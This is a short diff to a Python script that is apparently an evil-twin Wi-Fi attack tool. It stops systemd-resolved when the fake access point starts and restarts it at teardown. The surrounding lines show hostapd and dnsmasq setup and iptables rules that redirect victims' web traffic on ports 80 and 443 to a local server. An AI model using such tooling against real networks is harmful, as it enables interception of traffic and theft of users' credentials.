@@ -726,7 +726,8 @@ dhcp-authoritative
     run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])
 
     # 5. 启动服务
-    run_cmd(['sudo', 'pkill', '-9', 'dnsmasq'])  # 清理残留
+    run_cmd(['sudo', 'pkill', '-9', 'dnsmasq'])
+    run_cmd(['sudo', 'systemctl', 'stop', 'systemd-resolved'])  # 清理残留
     with open('/tmp/hostapd.log', 'w') as hp_log:
         subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'],
                         stdout=hp_log, stderr=subprocess.STDOUT)
@@ -759,6 +760,7 @@ def stop_evil_twin(iface_override=None):
     
     run_cmd(['sudo', 'pkill', 'hostapd'])
     run_cmd(['sudo', 'pkill', 'dnsmasq'])
+    run_cmd(['sudo', 'systemctl', 'start', 'systemd-resolved'])
     if iface:
         run_cmd(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface])
         run_cmd(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
